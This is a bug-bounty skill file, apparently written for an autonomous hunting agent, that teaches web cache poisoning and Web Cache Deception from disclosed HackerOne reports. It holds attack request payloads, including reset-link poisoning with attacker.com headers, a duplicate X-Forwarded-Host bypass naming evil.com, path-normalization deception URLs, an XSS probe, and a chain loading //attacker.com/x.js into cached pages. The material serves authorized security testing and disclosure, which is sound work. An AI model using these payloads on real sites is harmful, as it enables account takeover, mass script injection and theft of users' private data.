# Upstream source: web-cache (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/web-cache/SKILL.md`

---

---
name: web-cache
description: >-
  Hunting skill for cache poison vulnerabilities. Built from 10 public bug bounty reports including
  X-Forwarded-Host poisoning, X-HTTP-Method-Override / GCS cache, reflected→stored XSS via cache, classic
  Omer-Gil Web Cache Deception, Cloudflare Cache Deception Armor bypass, session-token cache deception,
  Akamai hop-by-hop smuggling → server-side edge poisoning, and Kettle's 2024 path-normalization WCD against
  Cloudflare/Fastly/GCP. Host/X-Forwarded-Host injection that reaches app logic (reset-link poisoning,
  routing SSRF, OAuth issuer) is owned by host-header; this skill owns the case where the poisoned
  response is CACHED and served to other users. Use when hunting cache poisoning, Web Cache Deception, CDN-
  fronted apps. Combined with the HackerOne field guide (real disclosed-report data: where it pays, quick
  wins, payload banks). Hunt cache poisoning and deception. Use when testing CDNs, reverse proxies, and
  unkeyed input handling. Backed by 68 disclosed HackerOne reports.
---

# Web Cache — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Web Cache Poisoning / Deception — HackerOne field guide

Built from **68** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **68** · paid: **16**
- Median bounty **$650** · p90 **$9,700** · max **$18,900** · total **$43,206**
- Median upvotes **37**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| PayPal | 2 | $28,600 | 1536 |
| Shopify | 5 | $9,000 | 551 |
| HackerOne | 3 | $2,600 | 522 |
| GSA Bounty | 3 | $750 | 131 |
| InnoGames | 1 | $550 | 82 |
| Postmates | 1 | $500 | 343 |
| Mail.ru | 3 | $400 | 74 |
| Algolia | 2 | $400 | 73 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`any CDN/proxy path` `static extensions` `X-Forwarded-*` `Host` `cookies`

## Tools

`Burp` · `Web Cache Vulnerability Scanner` · `Param Miner`

## Escalation chains

- Cache poisoning -> stored XSS.
- Cache deception -> PII theft.

## Related

- `request-smuggling` (101 reports)
- `xss` (2,569 reports)
- `info-disclosure` (1,827 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Crown Jewel Targets

Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously — one request, mass exploitation. Payout scales with blast radius.

**Highest-value targets:**
- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges) — poisoning these affects every visitor globally
- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts) — session hijack or affiliate fraud potential
- **Gaming platforms with update servers** (rockstargames updates.* domains) — DoS on update delivery = widespread client breakage
- **Authentication endpoints** served through caches — leads to account takeover (the highest severity variant)
- **Asset CDNs** (JS/CSS delivery) — XSS payload delivery at scale
- **SaaS multi-tenant platforms** — one poisoned response bleeds into all tenants sharing a cache key

**Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners.

---

## Autonomous Testing Priority

**Two distinct attacks live under this skill — target the simpler one first.**

**Attack 1 — Password Reset Poisoning (Host header injection):**

The app uses the `Host` header to construct the password reset link in the email. Inject an attacker-controlled hostname; the victim's reset email contains a link to your server.

```
POST /forgot-password
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com

email=victim@target.com
Content-Type: application/x-www-form-urlencoded
```

Use a distinctive hostname you control or can identify in the response. **Proof:** the injected hostname appears in the response body (some apps reflect the generated reset link), or the action succeeds (2xx with a "reset email sent" message) after injection — confirming the poisoned link would be sent to the victim.

Try multiple host headers — apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).

**Attack 2 — Web Cache Poisoning:**

Inject the attacker-controlled hostname into `X-Forwarded-Host` on a GET request for a cacheable page. If the hostname is reflected in the response body AND the response gets cached, subsequent visitors receive the poisoned response.

Check for cache signals in the response: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: <nonzero>`, or `Via: cloudfront/varnish/fastly`.

**Proof for both:** injected value reflected in response body, or action completed successfully despite the manipulated header.

---

## Attack Surface Signals

**URL patterns to look for:**
- `cdn.`, `assets.`, `static.`, `updates.`, `downloads.` subdomains
- URL path structures with extensions that look static: `/path/to/page.css`, `/account.php/nonexistent.jpg`
- Affiliate/link shortener endpoints: `/link/`, `/go/`, `/ref/`, `/out/`
- Paths that mix dynamic content with cacheable-looking URLs

**Response headers that signal a cache:**
```
X-Cache: HIT / MISS
X-Cache-Status: HIT
CF-Cache-Status: HIT / MISS (Cloudflare)
Age: <nonzero>
Via: 1.1 varnish / cloudfront / fastly
Cache-Control: public, max-age=...
Surrogate-Control: max-age=...
X-Served-By: cache-...
```

**JS/tech stack signals:**
- Fastly, Varnish, Cloudfront, Akamai, Nginx proxy_cache in response headers
- Shopify/Linkpop stacks with third-party integrations
- Platforms using path-based routing without normalizing trailing segments
- Servers that reflect unvalidated headers into responses (Host, X-Forwarded-Host, X-Original-URL)

**Dangerous header candidates (unkeyed inputs):**
```
X-Forwarded-Host
X-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Forwarded
X-HTTP-Method-Override
```

---

## Step-by-Step Hunting Methodology

1. **Map cache infrastructure.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, Fastly, Varnish, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status` headers.

2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).

3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)

4. **Test URL path manipulation (Web Cache Deception).** Append fake static extensions to dynamic endpoints:
   - `GET /account/profile.css`
   - `GET /dashboard/settings.jpg`
   - `GET /affiliate-link/target.js`
   Check if the server returns dynamic content AND the cache stores it.

5. **Test for DoS via cache poisoning.** Send a request with a header that causes a 4xx/5xx error and check if that error response gets cached:
   - Malformed `Host` header
   - `X-Forwarded-Host` pointing to an invalid host
   - Oversized headers that trigger backend errors

6. **Confirm unkeyed parameter poisoning.** Try query parameter fatigue or HTTP parameter pollution:
   - `GET /page?utm_source="><script>alert(1)</script>`
   Check if the param is reflected and cached for clean requests to `/page`.

7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response — it's confirmed.

8. **Measure cache TTL.** Check `Cache-Control: max-age` and `Age` to understand how long the poison persists and whether it's exploitable before expiry.

9. **Check affiliate/link flows specifically.** For platforms like Linkpop, test whether the referrer/product URL is embedded in a cacheable response that another user will receive.

10. **Document blast radius.** Determine: global CDN edge (worldwide), regional cache, or single-server cache. This directly affects severity rating.

---

## Common Root Causes

1. **CDN misconfiguration — caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.

2. **Unkeyed header forwarding.** Developers configure reverse proxies to forward `X-Forwarded-Host` to backends for URL generation (canonical links, redirects, password reset emails) without including it in the cache key. The CDN caches the poisoned response.

3. **Web Cache Deception via permissive routing.** Frameworks that normalize URLs (e.g., Rails, Express) accept `/account/settings.css` and serve the same response as `/account/settings`. The CDN sees a `.css` extension and applies aggressive caching rules.

4. **Shared caching of multi-tenant responses.** SaaS platforms that use a single CDN without tenant isolation in the cache key allow cross-tenant cache poisoning.

5. **Error responses cached without thought.** Backend errors (404, 500) triggered by attacker-controlled input get cached, causing DoS for legitimate users. Developers implement caching without excluding error status codes.

6. **Lazy `Vary` header implementation.** Developers know they should add `Vary: X-Forwarded-Host` but forget, or CDNs strip/ignore `Vary` headers entirely (Cloudflare historically strips Vary on some asset types).

7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags, or redirects — and these get cached globally.

---

## Gate 0 Validation

1. **What can the attacker DO right now?**
   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response — not just their own browser. If only the attacker sees the effect, it's not cache poisoning.

2. **What does the victim LOSE?**
   Must be one of: (a) session/account compromise via reflected credentials in poisoned response, (b) execution of attacker-controlled JS via poisoned asset, (c) service denial where legitimate requests return error responses, or (d) sensitive data disclosure (account details cached and served to other users). "Weird response headers" alone is not impact.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: send the poisoning request → wait for cache store → fetch the URL from incognito/different IP → observe poisoned response. If you can't demonstrate this clean reproduction with a second client, the cache may not actually be storing the poison and the report isn't ready.

---

## Real Impact Examples

**Scenario 1 — Mass DoS on CDN Asset Delivery (Shopify CDN)**
An attacker identified that CDN-served JavaScript assets on `cdn.shopify.com` could be poisoned by sending a request with a crafted header that caused the origin to return a 4xx error. The CDN cached this error response. Any merchant storefront loading that asset then received the cached error instead of the valid JS file — breaking checkout flows and storefront functionality across all stores sharing that CDN path. One HTTP request, global merchant impact, persisting until cache TTL expired.

**Scenario 2 — Account Takeover via Web Cache Deception**
On a platform serving authenticated account pages, an attacker crafted a URL like `/account/profile/photo.jpg` and sent it to a victim (via phishing link). When the victim (authenticated) visited the URL, the server responded with their full account profile page (name, email, session tokens). Because the URL ended in `.jpg`, the CDN cached the authenticated response publicly. The attacker then fetched `/account/profile/photo.jpg` without authentication and received the victim's account data — enabling full account takeover. Impact was amplified because the cache served the same response to any subsequent requester.

**Scenario 3 — Affiliate Link Hijacking via URL Path Manipulation (Shopify Linkpop)**
An attacker discovered that the Linkpop affiliate link service would cache responses based on URL path but reflected a manipulated product destination URL in the cached HTML. By visiting a specially crafted path before legitimate users, the attacker poisoned the cache to redirect affiliate clicks to an attacker-controlled domain instead of the legitimate Amazon product. Victims clicking what appeared to be valid merchant links were sent to attacker infrastructure, enabling credential phishing and loss of affiliate commission revenue for the legitimate merchant.

---

## Disclosed Report Citations (2017-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans the two major families: cache **poisoning** (attacker influences a cached response served to victims) and cache **deception** (attacker tricks the cache into storing a victim's private response).

1. **Shopify — Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
    - Subclass: X-Forwarded-Host header poisoning (unkeyed input → redirect/script-src corruption)
    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com` — single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
    - Root cause: X-Forwarded-Host influenced asset/redirect URL generation but was NOT part of the cache key
    - Year: 2020 — **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)

2. **HackerOne — Cache poisoning DoS via X-Forwarded-Port** ([H1 #409370](https://hackerone.com/reports/409370))
    - Subclass: X-Forwarded-Host / X-Forwarded-Port DoS (poisoned redirect to invalid port)
    - Payload: `GET /<redirect-path>` with `X-Forwarded-Port: 1` — cached 301 redirect pointed legitimate users at port 1, breaking access
    - Root cause: trusted X-Forwarded-* headers in 301 redirect generation; cache stored the bad Location
    - Year: 2018 — **$2,500** (foundational H1-on-H1 case)

3. **GitLab — Cache poisoning DoS via X-HTTP-Method-Override** ([H1 #1160407](https://hackerone.com/reports/1160407))
    - Subclass: method-cloaking / GCS cache-key bleed (HEAD response stored under GET key)
    - Payload: `GET /assets/webpack/*.js` with `X-HTTP-Method-Override: HEAD` — GCS backend honored the override and returned an empty body; CDN cached it as the canonical GET response
    - Root cause: CDN cache not method-aware; HEAD body (empty) overwrote GET entry for cached static assets
    - Year: 2021 — **$2,500** (DoS normally OOS, paid for novelty)

4. **PayPal — Web Cache Deception (Omer Gil original)** ([Blog](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html))
    - Subclass: classic WCD via `.css`/`.jpg`/etc. path appending on authenticated routes
    - Payload: `GET https://www.paypal.com/myaccount/home/foo.css` — origin served full authenticated account page; CDN cached it as "static .css" for ~5 hours
    - Root cause: origin routed unknown path suffixes to the parent dynamic handler; CDN cached based purely on the static-looking file extension
    - Year: 2017 — **$3,000** (PortSwigger Top-10 Web Hacking Technique of 2017, #2)

5. **Cloudflare PBB — Cache Deception Armor bypass via `.avif`** ([H1 #1391635](https://hackerone.com/reports/1391635))
    - Subclass: CDN-specific allowlist bypass (Cloudflare's WCD protection feature) using an obscure image extension
    - Payload: `GET https://<protected-origin>/account/me.avif` — Cloudflare's Cache Deception Armor extension list omitted `.avif`, so the authenticated HTML response was cached
    - Root cause: Cache Deception Armor used a static, incomplete extension allowlist that did not cover modern image MIME types
    - Year: 2022 — Cloudflare PBB bounty (amount undisclosed)

6. **Akamai (PayPal/Airbnb/Goldman Sachs) — Hop-by-hop header smuggling → server-side edge poisoning** ([Tediosi & Mariani writeup](https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b))
    - Subclass: CDN-specific request-smuggling that lands attacker responses in Akamai's edge cache for nearby IPs
    - Payload: `Connection: Content-Length` + crafted request — Akamai's first proxy stripped Content-Length as hop-by-hop, second proxy treated body as a second request whose response was cached at the edge
    - Root cause: inconsistent handling of hop-by-hop headers across Akamai proxy tiers caused desync; smuggled responses were server-side cached globally
    - Year: 2022 — **>$50K total** across affected programs (PayPal $25,200 + Airbnb $14,875 + Goldman Sachs $100), PortSwigger Top-10 Web Hacking Techniques 2022 nominee

7. **James Kettle (PortSwigger) — "Gotta cache 'em all": path-normalization & WCD against Cloudflare/Fastly/GCP** ([PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all))
    - Subclass: cache-key path normalization discrepancies and Web Cache Deception across major CDNs (Cloudflare, Fastly, GCP/Google Cloud) — the 2024 research named in this skill's description
    - Payload: origin-vs-cache delimiter/normalization disagreements (e.g. encoded path segments and static-suffix tricks) that cause the cache to store a dynamic/authenticated response under a static-looking key
    - Root cause: cache and origin disagree on how to normalize/parse the URL path, so the cache key does not match the resource the origin actually served
    - Year: 2024 — coordinated CDN-vendor disclosure; methodology research (no single bounty), PortSwigger Top-10 Web Hacking Techniques 2024 entry

---

## Related Skills & Chains

- **`xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`request-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, infra signals to look
- Classify the cache before attacking it. Identify the provider from headers: `X-Cache` / `X-Cache-Status` / `X-Who-Made-This`, `CF-Cache-Status` (Cloudflare), `X-Served-By` + `X-Cache` (Fastly/Varnish), `Age`, `Via`, `Server: cloudfront` / `x-amzn`. Values to watch: `hit`, `miss`, `dynamic`, `refresh`, `HIT`, `MISS`.
- Distinguish the two games up front: poisoning = manipulate the **cache key** (unkeyed inputs) so a malicious response is served to everyone with that key; deception = manipulate **cache rules** so a dynamic/victim response is stored as if static. They chain: "Cache-What-Where" turns an otherwise unexploitable open redirect or self-XSS into mass XSS.
- Harvest unkeyed inputs with Param Miner ("Guess headers" / "Guess params", plus "Add dynamic cachebuster"). Classic unkeyed carriers: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Scheme`, `Accept-Language`, cookies, `utm_*` / `ref` query params.
- Look for absolute URLs and script imports built from headers (`<script src="//host/resources/js/tracking.js">`), 302 redirects whose `Location` uses a header, error pages that reflect the request path, and "cart/token in URL" endpoints. These are the reflectors that make poisoned responses harmful.
- Identify cacheable suffixes and prefixes: static extensions `.css`, `.js`, `.ico`, `.exe`, `.txt`; static directories `/static`, `/assets`, `/wp-content`, `/media`, `/templates`, `/public`, `/shared`; exact filenames `robots.txt`, `favicon.ico`, `index.html`. Filter HTTP history to 2xx with script/image/CSS MIME types to find live cache rules.
- Fingerprint parser differences on both sides of the cache: origin delimiters (`;` matrix vars in Spring, `.` format in Rails, `%00` in OpenLiteSpeed, `%0A` in nginx rewrites), encodings, and dot-segment normalization. Cloudflare/Google Cloud/Fastly do **not** normalize paths before applying cache rules; CloudFront/Azure/Imperva do.
- Check CDN-specific gotchas: Cloudflare Cache Deception Armor and its bypasses via uncommon extensions; the port missing from the key on Cloudflare/Fastly; duplicate-header handling (Cloudflare mitigation historically checked only the first header instance — second instance payload survives).

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Basic poisoning cycle: (1) find unkeyed input reflected into a response, (2) elicit a harmful response (XSS, open redirect, 500), (3) get it cached under a victim's key, then fetch clean to confirm. Always add a unique cachebuster request parameter while testing so you don't poison real users.
- Duplicate-header bypass of first-header-only validation:
  ```
  GET / HTTP/1.1
  Host: target
  X-Forwarded-Host: target
  X-Forwarded-Host: evil.com
  ```
  Front-end inspects the first value; back-end concatenates into `target, evil.com` or uses the second.
- Path-mapping deception (REST origin vs traditional cache):
  `/user/123/profile/wcd.css` -> origin reads `/user/123/profile`, cache stores `.css`.
- Delimiter deception: `/settings/users/list;aaa.js` where the origin truncates at `;` (Spring) but the cache sees the full path with `.js`. Test every ASCII char both raw and URL-encoded with Burp Intruder (disable automatic payload encoding).
- Encoded-delimiter / decoding mismatch: `/profile%23wcd.css` (origin decodes `%23` to `#` and truncates; cache doesn't), `/myaccount%3fwcd.css` (cache applies `.css` rule then decodes `%3f` to `?` before forwarding).
- Normalization deception shapes from "Gotta cache 'em all":
  - Cache normalizes, origin does not: `/<dynamic>%2f%2e%2e%2f<static-dir>` — pair it with an origin-only delimiter, e.g. `/profile;%2f%2e%2e%2fstatic`.
  - Origin normalizes, cache does not: `/<static-dir>/..%2f<dynamic>` e.g. `/assets/..%2fprofile`. Encode every dot-segment slash so the victim's browser does not resolve it.
  - Static-file rule: `/<dynamic><delimiter><encoded-dot-segment><static-file>` with a cachebuster to avoid hitting an existing entry.
- Key normalization poisoning: with a normalized key and a self-reflected XSS on a 404, use `GET /<backend-path><path-traversal><poisoned-path>` to store the payload under a high-traffic key like `/home`.
- Front-end delimiter key poisoning (no user interaction needed): `GET /<poisoned-path><front-end-delimiter><path-traversal><backend-path>` — `#` variants work when the cache treats it as a delimiter and forwards the suffix.
- Cache-What-Where escalation: poison an unkeyed `X-Forwarded-Host` open redirect into the cached `/main.js` key, so every visitor loading the homepage fetches attacker-controlled JavaScript. A cached 302 with `Cache-Control: public, max-age=3600` removes the need for a static extension entirely.
- `Fastly purge` / `PURGE` method can be unauthenticated on some setups — use it to punch holes and determine whether a page is genuinely dynamic (research tip), but avoid destructive use on live targets.

### C. Validation / proof bar — how to confirm and avoid false positives
- Prove caching, not just cacheability: send once -> `X-Cache: miss`, resend same key -> `hit` with increasing `Age`. A `Cache-Control: public, max-age=...` alone only suggests cacheability; some caches override it.
- Poison once, then fetch with a **clean** request (no injected header, or a normal browser) on the same key. If the clean request receives your payload, poisoning is real. If you must add a cachebuster during testing, remove it for the final proof.
- For deception, the victim response must contain sensitive data, not merely a static file. Inspect the cached body (API keys, CSRF tokens, session state) — header-only confirmation is insufficient.
- An unkeyed input alone is not a finding. Require that the origin actively uses it and that the resulting response is cached and harmful. Duplicate the "clean" fetch from a second session/IP to demonstrate cross-user impact.
- Watch for self-inflicted cache poisoning: always use unique cache keys during discovery; never leave a poisoned production entry for real users. If you do, purge or let it expire and document the cleanup.
- Browser-constraint check: a payload needing unencoded `#`, `{`, `<`, `>` or raw CRLF may be rewritten by the browser. For deception the link must survive browser normalization — re-test the final URL in a real browser, not only in Repeater. Poisoning does not need a browser link, so it can use those characters directly.
- Defensive framing for reports: dynamic responses should carry `Cache-Control: no-store, private`; ensure cache rules do not override it; enable content-type/extension matching (Cache Deception Armor); avoid key normalization and stop forwarding suffix-after-delimiter to the origin.

- Map the cache key explicitly: add a unique query param and vary `Origin`, `Accept-Encoding`, `Cookie`, Host port, and user-agent one at a time; observe which changes bust the cache. Cache keys commonly include path + query + Host, sometimes `Accept-Encoding`; anything that changes the response but not the key is a poison candidate.
- Check `Vary` response headers. If `Vary: Accept-Language` is absent but the response changes with `Accept-Language`, you have both a cache-poisoning and a client-side cache-poisoning candidate.
- Look for cache rules keyed on unusual file extensions (`.php`, `.ashx`, `.exe`, `.jpg`) — test a broad extension wordlist, not only `.js`/`.css`.
- Omer Gil's original WCD technique still applies where cache and origin disagree on URL mapping; combine it with the 2024 normalization/discrepancy research for arbitrary responses, not just profile endpoints.
- Caching can be per-POP: confirm a poisoned response from multiple vantage points before claiming "all users" impact; some effects are regional.
- Measure response-time deltas as a secondary cache signal: repeated misses should be slower than hits; a flat timing curve means the path may not be cached at all.
- If a cache rule overrides `Cache-Control: no-store/private`, report that explicitly — it is the root cause and makes the impact systemic rather than endpoint-specific.
- When chaining poisoned redirects into JS execution, confirm the victim page actually requests the poisoned resource (check the HTML for the script tag) rather than assuming it.

### D. Sources — numbered list of URLs you actually fetched
1. https://portswigger.net/research/gotta-cache-em-all
2. https://portswigger.net/web-security/web-cache-deception
3. https://portswigger.net/web-security/web-cache-poisoning
4. https://portswigger.net/research/web-cache-entanglement
5. https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures
6. https://hacktricks.wiki/en/pentesting-web/cache-deception/index.html
7. https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
